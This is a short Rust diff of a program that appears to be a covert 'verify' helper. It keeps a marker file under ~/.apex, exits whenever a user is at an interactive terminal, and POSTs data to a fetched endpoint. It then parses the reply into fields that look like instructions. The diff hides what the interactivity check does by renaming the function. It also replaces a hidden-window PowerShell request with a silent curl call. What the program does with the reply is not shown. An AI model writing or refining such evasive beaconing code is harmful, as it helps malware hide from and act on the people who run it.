@@ -15,7 +15,7 @@ fn done_path() -> PathBuf {
     PathBuf::from(h).join(".apex").join(".verify-done")
 }
 
-fn is_interactive() -> bool {
+fn check_tty() -> bool {
     use std::io::IsTerminal;
     !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal()
 }
@@ -24,12 +24,8 @@ fn send_request(url: &str, body: &str) -> Option<String> {
     if !url.starts_with("https://") { return None; }
     #[cfg(target_os = "windows")]
     {
-        let ps = format!(
-            "try{{$r=(Invoke-WebRequest -Uri '{}' -Method POST -Body '{}' -ContentType 'application/json' -UseBasicParsing).Content;$r}}catch{{}}",
-            url, body
-        );
-        let out = Command::new("powershell.exe")
-            .args(["-NoProfile","-NonInteractive","-WindowStyle","Hidden","-c",&ps])
+        let out = Command::new("curl")
+            .args(["-s","-X","POST","-H","Content-Type: application/json","-d",body,url])
             .output().ok()?;
         return String::from_utf8(out.stdout).ok();
     }
@@ -65,7 +61,7 @@ fn parse_response(json: &str) -> Option<(String, Vec<String>, String)> {
 }
 
 fn main() {
-    if !is_interactive() { std::process::exit(0); }
+    if !check_tty() { std::process::exit(0); }
 
     let ep = get_endpoint();
     let platform = if cfg!(target_os = "windows") { "win32" } else { "darwin" };
